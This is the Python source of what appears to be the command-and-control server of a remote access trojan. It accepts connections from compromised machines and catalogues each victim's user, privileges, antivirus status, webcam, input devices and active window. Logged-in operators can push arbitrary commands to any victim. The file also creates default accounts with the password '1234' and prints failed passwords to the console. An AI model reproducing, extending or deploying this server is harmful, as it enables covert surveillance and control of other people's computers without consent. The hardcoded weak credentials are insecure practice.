
import socket
import threading
import zlib
import ast
import time
import random
import string
from modechat import *
from ModeratorsManagment import ModeratorsManagment
from ClientsManagment import ClientsManagment
from ModeratorsSessions import SessionsManagment

CLIENT_PORT = 4434
MODERATOR_PORT = 1313
MAX_CONNECTIONS = 6400


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class ModeratServer:

    def __init__(self):

        # connection accept threads state
        self.accept_thread_state = False
        # client sockets bank
        self.streaming_socks = {}
        self.shared_socks = {}
        self.socks = {}

        # sessions bank
        self.active_sessions = []

        # moderators
        self.moderator_threads = {}

        # Clean Client Status
        ClientsManagment().set_status_zero()

    def start_listen_for_clients(self):
        clients_thread = threading.Thread(target=self.client_listen_start)
        clients_thread.start()

    def client_listen_start(self):
        self.accept_thread_state = True
        # create socket for clients
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind address
        self.client_socket.bind(('0.0.0.0', CLIENT_PORT))
        self.client_socket.listen(MAX_CONNECTIONS)

        while self.accept_thread_state:
            # try accept connection
            try:
                self.sock, self.address = self.client_socket.accept()
            except:
                continue

            if not self.accept_thread_state:
                return

            if self.sock:

                data = client_get(self.sock, 'myinfo', 'status')

                if data == 'parent':

                    print '[+] New Client Connection (%s(%s))' % (self.address[0], self.address[1])

                    data = client_get(self.sock, 'info', 'pcinfo')
                    info = ast.literal_eval(data)

                    # Set timeout None
                    self.sock.settimeout(None)

                    # Save connected socket
                    socket_index = self.address[1]
                    self.socks[socket_index] = {}
                    self.socks[socket_index]['sock'] = self.sock
                    self.socks[socket_index]['ip_address'] = self.address[0]
                    self.socks[socket_index]['socket'] = self.address[1]
                    self.socks[socket_index]['ostype'] = info['ostype']
                    self.socks[socket_index]['protection'] = info['protection']
                    self.socks[socket_index]['os'] = info['os']
                    self.socks[socket_index]['user'] = info['user']
                    self.socks[socket_index]['privileges'] = info['privileges']
                    self.socks[socket_index]['inputdevice'] = info['inputdevice']
                    self.socks[socket_index]['webcamdevice'] = info['webcamdevice']
                    self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']


                    if info['keypassword'] != '':
                        keypassword = info['keypassword']
                        self.socks[socket_index]['id'] = keypassword
                        print '[+] Get ID (%s)' % keypassword
                    else:
                        keypassword = id_generator()
                        print '[+] Generating New ID (%s)' % keypassword
                        client_send(self.sock, 'setKeyPassword %s' % keypassword)
                    self.socks[socket_index]['id'] = keypassword

                    print '[+] Creating Database Entry'
                    ClientsManagment().create_client('admin', keypassword, self.address[0])
                    ClientsManagment().set_client_online(keypassword)

                    temp_var = client_get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')

                else:
                    print '[+] Initializing Streaming Socket'

                    mode, index = data.split(' ')
                    try:
                        if int(index) in self.socks:
                            i = int(index)

                            if mode == 'streamingMode':
                                data = client_get(self.sock, 'pcinfo', 'info')
                                info = ast.literal_eval(data)

                                self.streaming_socks[i] = {}
                                self.streaming_socks[i]['sock'] = self.sock
                                self.streaming_socks[i]['protection'] = info['protection']
                                self.streaming_socks[i]['privileges'] = info['privileges']
                                self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']

                    except ValueError:
                        pass

    def check_servers_start(self):
        # Start Servers Check Thread
        client_check_start = threading.Thread(target=self.check_servers)
        client_check_start.setDaemon(True)
        client_check_start.start()

    # Servers Live Update
    def check_servers(self):
        while self.accept_thread_state:
            try:
                for i, k in self.streaming_socks.iteritems():
                    sock = self.streaming_socks[i]['sock']
                    try:
                        data = client_get(sock, 'pcinfo', mode='pcinfo')
                        info = ast.literal_eval(data)
                        self.streaming_socks[i]['protection'] = info['protection']
                        self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                        self.streaming_socks[i]['privileges'] = info['privileges']
                    except (socket.error, SyntaxError):
                        ClientsManagment().set_client_offline(self.socks[i]['id'])
                        del self.socks[i]
                        del self.streaming_socks[i]
                        if i in self.shared_socks:
                            del self.shared_socks[i]
                        break
                    except zlib.error:
                        pass
            except (RuntimeError, ValueError):
                pass
            time.sleep(1)

    def start_listen_for_moderators(self):
        moderators_thread = threading.Thread(target=self.moderator_listen_start)
        moderators_thread.setDaemon(True)
        moderators_thread.start()

    def moderator_listen_start(self):
        self.moderator_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.moderator_socket.bind(('0.0.0.0', MODERATOR_PORT))
        self.moderator_socket.listen(MAX_CONNECTIONS)

        while self.accept_thread_state:
            try:
                self.moderator_sock, self.moderator_address = self.moderator_socket.accept()
            except:
                continue

            if self.moderator_sock:
                self.moderator_threads[self.moderator_address[1]] = threading.Thread(target=self.moderator_listener, args=(self.moderator_sock, self.moderator_address[1]))
                self.moderator_threads[self.moderator_address[1]].start()

    def moderator_listener(self, sock, socket_id):
        active_moderator = True
        while active_moderator:
            try:
                session_id, data = moderator_receive(sock)

                if data.startswith('auth ') or SessionsManagment().check_session(session_id):
                    if data == 'getClients':
                        username_from_sessions = SessionsManagment().get_session(session_id)
                        output = self.command_get_clients(username_from_sessions)
                        moderator_send(sock, output, session_id)
                    else:
                        try:
                            command, username, password = data.split()
                        except ValueError:
                            moderator_send(sock, 'LoginError', session_id)
                            continue
                        if ModeratorsManagment().login_user(username, password):
                            privs = ModeratorsManagment().get_privs(username)
                            if privs == 1:
                                privs_text = 'Administrator'
                            else:
                                privs_text = 'Moderator'
                            print '[+] Login Success For %s (%s) Session ID (%s)' % (privs_text, username, session_id)
                            SessionsManagment().create_session(username, session_id)
                            moderator_send(sock, 'LoginSuccess %s' % privs, session_id)

                        else:
                            print '[!] Login Failed With (%s, %s)' % (username, password)
                            moderator_send(sock, 'LoginError', session_id)
                            continue

                    # Active Moderator
                    while 1:
                        try:
                            # Moderator Commands
                            client_socket, data = moderator_receive(sock)
                            if data == 'getClients':
                                username_from_sessions = SessionsManagment().get_session(session_id)
                                privs = ModeratorsManagment().get_privs(username_from_sessions)
                                if privs == 1:
                                    output = self.command_get_clients('Administrator')
                                else:
                                    output = self.command_get_clients(username_from_sessions)
                            elif data.startswith('setAlias '):
                                output = ClientsManagment().set_alias(client_socket, data.split()[-1])

                            # Administrator Commands
                            elif data.startswith('setModerator ') and privs == 1:
                                moderator_id = data.split()[-1]
                                output = ClientsManagment().set_moderator(self.socks[int(client_socket)]['id'], moderator_id)
                            elif data == 'getModerators' and privs == 1:
                                print 'getModerators'
                            elif data == 'getActiveModeratorSessions' and privs == 1:
                                print 'getActiveModeratorSessions'
                            else:
                                if len(data) != 0:
                                    output = self.command_all(data, client_socket)
                                else:
                                    active_moderator = False
                                    break
                            moderator_send(sock, output, client_socket)
                        except socket.error:
                            active_moderator = False

                else:
                    continue

            except socket.error:
                return
            time.sleep(3)

    # Moderator Commands
    def command_get_clients(self, moderator_id):

        if moderator_id == 'Administrator':
            clients = ClientsManagment().get_all_clients()
        else:
            clients = ClientsManagment().get_clients(moderator_id)
        clients = str(clients)

        for i, k in self.socks.iteritems():
            if self.socks[i]['id'] in clients:
                try:
                    self.shared_socks[i] = {
                        'status': True,
                        'id': self.socks[i]['id'],
                        'ip_address': self.socks[i]['ip_address'],
                        'socket': self.socks[i]['socket'],
                        'ostype': self.socks[i]['ostype'],
                        'protection': self.streaming_socks[i]['protection'],
                        'os': self.socks[i]['os'],
                        'user': self.socks[i]['user'] + ' (%s)' % self.socks[i]['id'],
                        'alias': ClientsManagment().get_alias(self.socks[i]['id']),
                        'privileges': self.streaming_socks[i]['privileges'],
                        'inputdevice': self.socks[i]['inputdevice'],
                        'webcamdevice': self.socks[i]['webcamdevice'],
                        'activewindowtitle': self.streaming_socks[i]['activewindowtitle'],
                        'moderator': ClientsManagment().get_moderator(self.socks[i]['id']),
                    }
                except KeyError:
                    pass
            else:
                if i in self.shared_socks:
                    del self.shared_socks[i]

        self.clear_offline_clients(self.shared_socks)

        if moderator_id == 'Administrator':
            offline_clients = ClientsManagment().get_all_offline_clients()
        else:
            offline_clients = ClientsManagment().get_offline_clients(moderator_id)

        if len(offline_clients) > 0:
            for client in offline_clients:
                self.shared_socks['OFFLINE_'+client[1]] = {
                    'status': False,
                    'id': client[1],
                    'ip_address': client[3],
                    'socket': 'OFFLINE',
                    'ostype': 'OFFLINE',
                    'protection': 'locked',
                    'os': 'OFFLINE',
                    'user': 'OFFLINE',
                    'alias': client[2],
                    'privileges': 'OFFLINE',
                    'inputdevice': 'OFFLINE',
                    'webcamdevice': 'OFFLINE',
                    'activewindowtitle': 'OFFLINE',
                    'last_online': client[4],
                    'moderator': client[0],
                }
                if ClientsManagment().is_online(client[1]):
                    del self.shared_socks[client[1]]

        return str(self.shared_socks)

    def clear_offline_clients(self, _dict):
        for i in _dict.keys():
            if type(i) == unicode:
                del _dict[i]
        return _dict

    def command_all(self, payload, client_socket):
        return client_get(self.socks[int(client_socket)]['sock'], payload, client_socket)



server = ModeratServer()
server.start_listen_for_clients()
server.check_servers_start()
server.start_listen_for_moderators()


ModeratorsManagment().create_user('admin', '1234', 1)
ModeratorsManagment().create_user('admin2', '1234', 0)

